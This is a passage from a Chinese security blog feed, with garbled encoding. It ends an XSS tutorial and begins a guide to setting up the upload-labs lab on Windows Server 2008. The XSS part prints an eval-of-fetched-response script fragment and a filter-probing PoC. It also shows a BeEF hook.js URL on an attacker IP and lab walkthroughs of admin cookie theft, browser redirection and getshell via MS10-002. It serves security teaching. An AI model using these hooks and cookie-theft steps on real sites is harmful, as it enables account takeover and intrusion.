punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">=</span>a<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">index0f</span><span class="token punctuation">(</span><span class="token string">'BOF|'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span>b<span class="token punctuation">.</span><span class="token function">index0f</span><span class="token punctuation">(</span><span class="token string">'EOF'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>      <span class="token constant">XSS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ— æ³•å¼¹çª—ï¼Œå¯èƒ½æ˜¯åŒæºç­–ç•¥å½±å“ã€‚</p><p>3ã€åº”å¯¹åŒæºç­–ç•¥</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-24%20%E4%B8%8A%E5%8D%8811.54.42.png" style="zoom:75%;"></blockquote><h2 id="4-4-å¤‡é€‰å­˜å‚¨æŠ€æœ¯"><a href="#4-4-å¤‡é€‰å­˜å‚¨æŠ€æœ¯" class="headerlink" title="4.4 å¤‡é€‰å­˜å‚¨æŠ€æœ¯"></a>4.4 å¤‡é€‰å­˜å‚¨æŠ€æœ¯</h2><p>æˆ‘ä»¬å¯ä»¥æŠŠShellcodeå­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„æœ¬åœ°åŸŸä¸­ï¼Œæ¯”å¦‚HTTP Cookieã€ Flashå…±äº«å¯¹è±¡ã€UserDataã€localStorage ç­‰ã€‚</p><p>ç”¨cookieç­‰å˜é‡å­˜å‚¨XSSä»£ç ã€‚</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-25%20%E4%B8%8A%E5%8D%889.34.30.png" style="zoom:45%;"><p>ç½‘ç«™è·å–ç”¨æˆ·åï¼Œname=ç”¨æˆ·åï¼Œä¸ºä¸€æ¡cookieè®°å½•ï¼Œæ¶æ„æ”»å‡»è€…å°†ç”¨æˆ·åè®¾ç½®ä¸ºæ¶æ„çš„JSè„šæœ¬ï¼Œå¦‚æœç½‘ç«™æ‰“å°å›æ˜¾è¯¥ç”¨æˆ·åï¼Œé‚£ä¹ˆä¼šå‡ºå‘JSä»£ç æ‰§è¡Œã€‚</p><h1 id="äº”ã€ä½¿ç”¨ç»ˆæPoCæµ‹è¯•è¿‡æ»¤å™¨çš„è¿‡æ»¤å†…å®¹"><a href="#äº”ã€ä½¿ç”¨ç»ˆæPoCæµ‹è¯•è¿‡æ»¤å™¨çš„è¿‡æ»¤å†…å®¹" class="headerlink" title="äº”ã€ä½¿ç”¨ç»ˆæPoCæµ‹è¯•è¿‡æ»¤å™¨çš„è¿‡æ»¤å†…å®¹"></a>äº”ã€ä½¿ç”¨ç»ˆæPoCæµ‹è¯•è¿‡æ»¤å™¨çš„è¿‡æ»¤å†…å®¹</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script " ' Oonn<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script script" ' Oonn<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script SCRscriptIPT " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="å…­ã€XSSçš„é˜²å¾¡"><a href="#å…­ã€XSSçš„é˜²å¾¡" class="headerlink" title="å…­ã€XSSçš„é˜²å¾¡"></a>å…­ã€XSSçš„é˜²å¾¡</h1><h2 id="6-1-XSS-è¿‡æ»¤å™¨"><a href="#6-1-XSS-è¿‡æ»¤å™¨" class="headerlink" title="6.1 XSS è¿‡æ»¤å™¨"></a>6.1 XSS è¿‡æ»¤å™¨</h2><ul><li>è¾“å…¥è¿‡æ»¤ï¼š<ul><li>è¾“å…¥éªŒè¯ï¼šç®€å•çš„è¯´ï¼Œè¾“å…¥éªŒè¯å°±æ˜¯å¯¹ç”¨æˆ·æäº¤çš„ä¿¡æ¯è¿›è¡Œæœ‰æ•ˆéªŒè¯ï¼Œä»…æ¥å—æŒ‡å®šé•¿åº¦èŒƒå›´å†…çš„ï¼Œé‡‡ç”¨é€‚å½“æ ¼å¼çš„å†…å®¹æäº¤ï¼Œé˜»æ­¢æˆ–è€…å¿½ç•¥é™¤æ­¤ä¹‹å¤–çš„å…¶ä»–ä»»ä½•æ•°æ®ã€‚</li><li>æ•°æ®æ¶ˆæ¯’ï¼šè¿‡æ»¤å’Œå‡€åŒ–æ‰æœ‰å®³çš„è¾“å…¥ã€‚</li></ul></li><li>è¾“å‡ºç¼–ç ï¼šHTMLç¼–ç ä¸»è¦æ˜¯ç”¨å¯¹åº”çš„HTMLå®ä½“ä»£æ›¿å­—ç¬¦ã€‚</li><li>é»‘ç™½åå•ï¼šä¸ç®¡æ˜¯é‡‡ç”¨è¾“å…¥è¿‡æ»¤è¿˜æ˜¯è¾“å‡ºç¼–ç ï¼Œéƒ½æ˜¯é’ˆå¯¹æ•°æ®ä¿¡æ¯è¿›è¡Œé»‘|ç™½åå•å¼çš„è¿‡æ»¤ã€‚é»‘åå•ï¼Œéå…è®¸æ•°æ®ã€‚ç™½åå•ï¼Œå…è®¸çš„æ•°æ®</li></ul><h2 id="6-2-æŠµå¾¡-DOM-XSSæ”»å‡»"><a href="#6-2-æŠµå¾¡-DOM-XSSæ”»å‡»" class="headerlink" title="6.2 æŠµå¾¡ DOM-XSSæ”»å‡»"></a>6.2 æŠµå¾¡ DOM-XSSæ”»å‡»</h2><ul><li>é¿å…ç”¨æˆ·ç«¯æ–‡æ¡£é‡å†™ã€é‡å®šå‘ç­‰æ•æ„Ÿæ“ä½œ</li></ul><h1 id="ä¸ƒã€æ¼æ´åˆ©ç”¨å·¥å…·å’Œå¹³å°"><a href="#ä¸ƒã€æ¼æ´åˆ©ç”¨å·¥å…·å’Œå¹³å°" class="headerlink" title="ä¸ƒã€æ¼æ´åˆ©ç”¨å·¥å…·å’Œå¹³å°"></a>ä¸ƒã€æ¼æ´åˆ©ç”¨å·¥å…·å’Œå¹³å°</h1><h2 id="7-1-xsså¹³å°"><a href="#7-1-xsså¹³å°" class="headerlink" title="7.1 xsså¹³å°"></a>7.1 xsså¹³å°</h2><p><a href="https://xssaq.com/">https://xssaq.com/</a></p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2025-02-06%2010.21.03.png" style="zoom:50%;"><h2 id="7-2-beef-xss"><a href="#7-2-beef-xss" class="headerlink" title="7.2 beef-xss"></a>7.2 beef-xss</h2><p>è¿œç¨‹æ‰§è¡Œshellcodeä¹‹åè¿›è¡Œå¦‚ä¸‹æ”»å‡»æ“ä½œ:</p><ul><li>Cookieçªƒå–ï¼Œå†’å……ç®¡ç†å‘˜ç™»é™†</li><li>æµè§ˆå™¨åŠ«æŒ</li><li>åˆ©ç”¨msf+beefé‡å®šå‘+ms10-002ï¼ˆXSSæ¼æ´ï¼‰ å¯¹XP è¿›è¡Œgetshell</li></ul><blockquote><h4 id="Beef-xssä½¿ç”¨æ¡ˆä¾‹ï¼š"><a href="#Beef-xssä½¿ç”¨æ¡ˆä¾‹ï¼š" class="headerlink" title="Beef-xssä½¿ç”¨æ¡ˆä¾‹ï¼š"></a>Beef-xssä½¿ç”¨æ¡ˆä¾‹ï¼š</h4><p>1ã€å®‰è£…å’Œé…ç½®</p><p>å®‰è£…beefï¼š <a href="https://blog.csdn.net/whoim_i/article/details/102877616">https://blog.csdn.net/whoim_i/article/details/102877616</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> beef-xss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8810.19.47.png" style="zoom:55%;"><p>å®‰è£…æˆåŠŸã€‚</p><p>beef-xss ã€å¯åŠ¨beefã€‘</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8810.21.15.png" style="zoom:45%;"><p>æç¤ºä¿®æ”¹å¯†ç ï¼š123.com</p><p>å¯åŠ¨æˆåŠŸã€‚è‡ªåŠ¨æ‰“å¼€webç•Œé¢ã€‚</p><p><a href="http://127.0.0.1:3000/ui/authentication">http://127.0.0.1:3000/ui/authentication</a></p><p> <a href="http://192.168.33.12:3000/ui/authentication">http://192.168.33.12:3000/ui/authentication</a></p><p> [beef 123.com ç™»é™†]</p><p>vim config.yaml  ã€ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‘</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8810.26.31.png" style="zoom:75%;"><p>é…ç½®æ–‡ä»¶çš„ç”¨æˆ·åå¯†ç ä¿®æ”¹ä½ç½®ã€‚</p><p>2ã€ä½¿ç”¨</p><p>beefé›†æˆåœ¨kaliä¸­ï¼Œå·¥å…·ç›®å½•/usr/share/beef-xss</p><p>é…ç½®æ–‡ä»¶:config.yaml</p><p>ä¿®æ”¹é»˜è®¤ç”¨æˆ·åå’Œå¯†ç </p><p>20è¡Œã€21è¡Œå·¦å³</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%889.07.16.png" style="zoom:75%;"><p>å¯åŠ¨beef: F1:./beef ã€   F2:beef-xss ã€ä¸å—ç›®å½•é™åˆ¶ã€‘</p><p>webç•Œé¢çš„ç®¡ç†æ§åˆ¶å°ï¼š</p><p><a href="http://127.0.0.1:3000/ui/panel">http://127.0.0.1:3000/ui/panel</a></p><p>â€‹     ç”¨æˆ·åå¯†ç ç™»é™†ã€‚</p><p>shellcodeï¼š</p><p> http://%3CIP%3E:3000/hook.js</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8810.34.11.png" style="zoom:55%;"><p>3ã€å®é™…æ¡ˆä¾‹</p><p>ç¯å¢ƒï¼šwin2008ã€æœåŠ¡å™¨ã€ CMSç•™è¨€æ¿ ã€‘192.168.33.4</p><p>â€‹           winxp ã€å—å®³è€…ã€ç½‘ç«™ç®¡ç†å‘˜ã€‘  192.168.33.10</p><p>â€‹            kali ã€æ”»å‡»è€…ã€‘ 192.168.33.12/24</p><ul><li><p>ms10002 xp xssæ¼æ´getshell</p></li><li><p>ms12063 win7 xssæ¼æ´getshell</p></li></ul><p><strong>EX1ï¼šæµè§ˆå™¨åŠ«æŒ</strong>-ã€Œegï¼šé‡å®šå‘ã€</p><p>1ï¼‰æ”»å‡»è€…ç™»é™†ç•™è¨€æ¿ç•™è¨€</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8810.51.23.png" style="zoom:45%;"><p>2ï¼‰ç®¡ç†å‘˜ç™»é™†ç³»ç»Ÿå®¡æ ¸ç•™è¨€ï¼Œé­å—æ”»å‡»ã€æ‰§è¡Œshellcode</p><p>admin 123456</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8810.53.22.png" style="zoom:75%;"><p>å—å®³è€…ä¸Šçº¿ã€‚</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8810.54.22.png" style="zoom:75%;"><p>3ï¼‰æ‰§è¡Œé‡å®šå‘ï¼Œå°†ç”¨æˆ·å¯¼å‘å…¶ä»–é“¾æ¥</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8811.07.15.png" style="zoom:75%;"><p><strong>EX2ï¼šcookieçªƒå–å’Œæ¬ºéª—ï¼ˆå›ºå®šä¼šè¯æ”»å‡»ï¼‰</strong>ã€Œegï¼šç›—å–ç®¡ç†å‘˜cookieç™»é™†åå°ï¼ˆè¢«æ”»å‡»è€…æ³¨é”€ä¹‹åæ”»å‡»è€…ä»ç„¶èƒ½ç™»é™†ï¼‰ã€</p><p>æ¥ç€EX1</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8811.08.21.png" style="zoom:75%;"><p>çªƒå–cookieä¿¡æ¯ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8810.56.11.png" style="zoom:75%;"><p>æ”»å‡»è€…å†’å……ç®¡ç†å‘˜ç™»é™†ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8811.04.04.png" style="zoom:75%;"><p>ç›´æ¥ç™»é™†åå°ï¼›</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8A%E5%8D%8811.04.26.png" style="zoom:75%;"><p>ç®¡ç†å‘˜æ³¨é”€è‡ªå·±çš„ç™»é™†ä¹‹åï¼Œæ”»å‡»è€…ä¾ç„¶å¯ä»¥è®¿é—®åå°ã€‚</p><p><strong>EX3:åˆ©ç”¨æµè§ˆå™¨æ¼æ´getshell</strong></p><blockquote><p>MS10-002 æ˜¯å¾®è½¯åœ¨ 2010 å¹´ 1 æœˆå‘å¸ƒçš„ä¸€ä¸ªå®‰å…¨å…¬å‘Šï¼Œæ¶‰åŠ Microsoft Internet Explorer æµè§ˆå™¨ä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ã€‚è¯¥æ¼æ´çš„ç¼–å·ä¸º <strong>CVE-2010-0249</strong>ï¼Œæ˜¯ Internet Explorer 6 å’Œ 7 ç‰ˆæœ¬ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p></blockquote><p>å·¥å…·-msf</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250206131940987.png" style="zoom:80%;"><p>æˆåŠŸåŸºäºXSSå’Œms10-002è·å–shellã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> XSS </tag>
            
            <tag> è·¨ç«™è„šæœ¬æ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs-windowsé¶åœºæ­å»º</title>
      <link href="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/"/>
      <url>/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦ä»‹ç»æ­å»ºåœ¨windows server 2008ä¸Šæ­å»ºupload-labsæ–‡ä»¶ä¸Šä¼ æ¼æ´é¶åœºçš„è¿‡ç¨‹ï¼ˆå…¶ä»–windowsç³»ç»Ÿä¹Ÿç±»ä¼¼ï¼‰ï¼Œè®°å½•äº†ä¸€äº›è¸©è¿‡çš„å‘ã€‚</p><h1 id="ä¸€ã€ç¯å¢ƒå‡†å¤‡"><a href="#ä¸€ã€ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‡†å¤‡"></a>ä¸€ã€ç¯å¢ƒå‡†å¤‡</h1><ul><li><p>æ“ä½œç³»ç»Ÿï¼šwindows server 2008 R2</p></li><li><p>å®‰è£…vmware toolsï¼šæ–¹ä¾¿åŒå®¿ä¸»æœºä¹‹å‰å¤åˆ¶æ–‡ä»¶</p></li><li><p>é¡¹ç›®æä¾›äº†ä¸€ä¸ªWindowsä¸‹æŒ‰ç…§é¶åœºé…ç½®è¦æ±‚é…ç½®å¥½çš„é›†æˆç¯å¢ƒï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://github.com/c0ny1/upload-labs/releases">https://github.com/c0ny1/upload-labs/releases</a></p></li></ul><p>é›†æˆç¯å¢ƒç»¿è‰²å…å®‰è£…ï¼Œè§£å‹å³å¯ä½¿ç”¨ã€‚</p><blockquote><h3 id="å®‰è£…vmware-toolsç¢°åˆ°çš„é—®é¢˜ï¼šwindowsæ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…ã€‚"><a href="#å®‰è£…vmware-toolsç¢°åˆ°çš„é—®é¢˜ï¼šwindowsæ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…ã€‚" class="headerlink" title="å®‰è£…vmware toolsç¢°åˆ°çš„é—®é¢˜ï¼šwindowsæ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…ã€‚"></a>å®‰è£…vmware toolsç¢°åˆ°çš„é—®é¢˜ï¼šwindowsæ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…ã€‚</h3><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2021.58.31.png" style="zoom:70%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.02.08.png" style="zoom:70%;"><p>æŠ¥é”™ä¿¡æ¯ï¼šwindowsæ— æ³•éªŒè¯æ­¤é©±åŠ¨ç¨‹åºè½¯ä»¶çš„å‘å¸ƒè€…ã€‚</p><p>1ã€è¡¥ä¸å‡çº§è½¯ä»¶ä¸‹è½½</p><p>è¿™æ˜¯å› ä¸ºè™šæ‹Ÿæœºå°‘äº†KB4474419è¡¥ä¸ï¼ŒæŒ‰ç…§ç³»ç»Ÿç±»å‹é€‰æ‹©ç›¸åº”çš„è¡¥ä¸å‡çº§åŒ…ï¼ˆä¸‹è½½é“¾æ¥ï¼š<a href="https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419%EF%BC%89%E3%80%82">https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419ï¼‰ã€‚</a></p><p>æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯ï¼Œæˆ‘è¿™é‡Œæ˜¯Windows Server 2008 R2 Enterprise</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.04.13.png" style="zoom:50%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.06.06.png" style="zoom:50%;"><p>å¦‚ä½•é€‰æ‹©é€‚ç”¨çš„ç‰ˆæœ¬ï¼š</p><blockquote><ol><li><strong>é€‚ç”¨äºåŸºäºItaniumçš„ç³»ç»Ÿ</strong>ï¼šå¦‚æœä½ çš„æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯Itaniumå¤„ç†å™¨ï¼Œæ‚¨åº”è¯¥é€‰æ‹©è¿™ä¸ªæ›´æ–°ã€‚Itaniumæ˜¯ä¸€ç§ç”±Intelè®¾è®¡çš„64ä½å¤„ç†å™¨æ¶æ„ï¼Œä¸»è¦ç”¨äºé«˜æ€§èƒ½è®¡ç®—å’Œä¼ä¸šæœåŠ¡å™¨ã€‚</li><li><strong>é€‚ç”¨äºåŸºäºx64çš„ç³»ç»Ÿ</strong>ï¼šå¦‚æœä½ çš„æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯x64æ¶æ„çš„å¤„ç†å™¨ï¼Œæ‚¨åº”è¯¥é€‰æ‹©è¿™ä¸ªæ›´æ–°ã€‚x64æ˜¯æœ€å¸¸è§çš„64ä½å¤„ç†å™¨æ¶æ„ï¼Œå¹¿æ³›åº”ç”¨äºç°ä»£çš„ä¸ªäººç”µè„‘å’ŒæœåŠ¡å™¨ã€‚</li></ol><p><strong>å¦‚ä½•ç¡®å®šç³»ç»Ÿç±»å‹å‘¢ï¼Ÿ</strong>ï¼š</p><ul><li>Msinfo32</li></ul><p>ä½ å¯ä»¥åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯æ¥ç¡®å®šå¤„ç†å™¨ç±»å‹ã€‚åœ¨Windows Server 2008 R2ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤æ¥æŸ¥çœ‹ï¼š</p><ol><li>ç‚¹å‡»â€œå¼€å§‹â€æŒ‰é’®ï¼Œç„¶åé€‰æ‹©â€œè¿è¡Œâ€ã€‚</li><li>è¾“å…¥<code>msinfo32</code>å¹¶æŒ‰å›è½¦é”®ã€‚</li><li>åœ¨æ‰“å¼€çš„â€œç³»ç»Ÿä¿¡æ¯â€çª—å£ä¸­ï¼ŒæŸ¥çœ‹â€œç³»ç»Ÿç±»å‹â€éƒ¨åˆ†ã€‚å¦‚æœæ˜¾ç¤ºçš„æ˜¯â€œx64-based PCâ€ï¼Œé‚£ä¹ˆä½ çš„ç³»ç»Ÿæ˜¯åŸºäºx64çš„ã€‚</li></ol><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.11.34.png" style="zoom:50%;"><ul><li>systeminfo</li></ul><p>å¦å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œå·¥å…·æ¥æŸ¥çœ‹ç³»ç»Ÿç±»å‹ã€‚æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼ˆä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼‰ï¼Œç„¶åè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹â€œç³»ç»Ÿç±»å‹â€å­—æ®µï¼šå¦‚æœè¾“å‡ºç»“æœåŒ…å«â€œx64â€ï¼Œé‚£ä¹ˆæ‚¨çš„ç³»ç»Ÿæ˜¯åŸºäºx64çš„ã€‚å¦‚æœè¾“å‡ºç»“æœåŒ…å«â€œIA-64â€ï¼Œé‚£ä¹ˆä½ çš„ç³»ç»Ÿæ˜¯åŸºäºItaniumçš„ã€‚ </p><p>ä¸‹é¢æ˜¯æˆ‘çš„ç³»ç»Ÿè¿è¡Œsysteminfoç»“æœä¸­å…³äºç³»ç»Ÿç±»å‹çš„æè¿°ï¼š</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.12.49.png" style="zoom:80%;"></blockquote><p>ä¸‹è½½çš„æ–‡ä»¶æ˜¯msuæ–‡ä»¶ã€‚MSUæ–‡ä»¶æ˜¯Windows Updateä½¿ç”¨çš„æ›´æ–°åŒ…æ ¼å¼ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªWindowsç³»ç»Ÿåº”ç”¨ç¨‹åºå’Œæ–‡ä»¶çš„æ›´æ–°ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.14.34.png" style="zoom:50%;"><p>2ã€æ”¾ç½®åœ¨éœ€è¦å‡çº§è¡¥ä¸çš„ç³»ç»Ÿä¸­</p><p>2.1 å¾…å‡çº§ç³»ç»Ÿç›´æ¥è®¿é—®ç½‘ç»œä¸‹è½½</p><p>å¦‚æœå¾…å‡çº§ç³»ç»Ÿèƒ½å¤Ÿè®¿é—®è¿™ä¸ªç«™ç‚¹ï¼Œé‚£å°±ç›´æ¥ä¸‹è½½å°±å¯ä»¥äº†ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-26%2011.59.49.png" style="zoom:50%;"><p>æˆ‘çš„è®¿é—®ä¸äº†ï¼Œæ‰€ä»¥é‡‡å–äº†ä¸‹é¢çš„åŠæ³•ã€‚</p><p>2.2 å±€åŸŸç½‘FTPæœåŠ¡å™¨ä¸‹è½½</p><p>è¿™é‡Œæˆ‘å°†è¿™ä¸ªæ–‡ä»¶å…ˆæ”¾åœ¨ä¸€ä¸ªåŒwin2008åœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…çš„win xpä¸»æœºã€‚è®©åè®©win2008è®¿é—®win xpçš„ftpæœåŠ¡ä¸‹è½½åˆ°æœ¬åœ°ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.22.52.png" style="zoom:50%;"><p>åœ¨win xpä¸Šå¿«é€Ÿæ­å»ºä¸€ä¸ªftpæœåŠ¡ï¼š</p><p><a href="https://www.firewall.cx/downloads/freeware-security-a-free-trials/3cdaemon-ftp-tftp-server-client.html">https://www.firewall.cx/downloads/freeware-security-a-free-trials/3cdaemon-ftp-tftp-server-client.html</a></p><p>ä¸‹è½½ä¹‹åæ”¾å…¥winxpï¼ˆæˆ‘è¿™å°xpç³»ç»Ÿä¹‹å‰å®‰è£…è¿‡wmware toolsï¼‰</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.30.41.png" style="zoom:50%;"><p>ä¸€è·¯å›è½¦å®‰è£…æˆåŠŸï¼Œå¯ä»¥åœ¨æ‰€æœ‰ç¨‹åºä¸­æ‰¾åˆ°å®‰è£…çš„è½¯ä»¶ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.32.05.png" style="zoom:50%;"><p>åŒå‡»å¯åŠ¨ï¼š</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.32.52.png" style="zoom:23%;"><p>é€‰æ‹©ftpé…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®ã€‚</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.37.25.png" style="zoom:40%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.40.07.png" style="zoom:50%;"><p>ä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„åŒ¿åè´¦æˆ·ï¼ˆä¸è¿‡è¦æ³¨æ„å®‰å…¨æ€§ï¼‰ï¼Œé…ç½®ä¸€ä¸‹æ–‡ä»¶ç›®å½•ã€‚</p><p>win2008è®¿é—®winxpï¼ˆip 192.168.52.9ï¼‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp://192.168.52.9 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.43.33.png" style="zoom:50%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.43.12.png" style="zoom:50%;"><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.44.31.png" style="zoom:50%;"><p>ä¸‹è½½msuæ–‡ä»¶ã€‚</p><p>å¦‚æœå‡ºç°ï¼šwindowsä½¿ç”¨FTPä¸‹è½½æ–‡ä»¶æç¤ºå½“å‰çš„å®‰å…¨è®¾ç½®ä¸å…è®¸ä»è¯¥ä½ç½®ä¸‹è½½æ–‡ä»¶</p><img src="/2025/01/25/web-an-quan/upload-labs-windows-ba-chang-da-jian/%E6%88%AA%E5%B1%8F2025-01-25%2022.49.00.png" 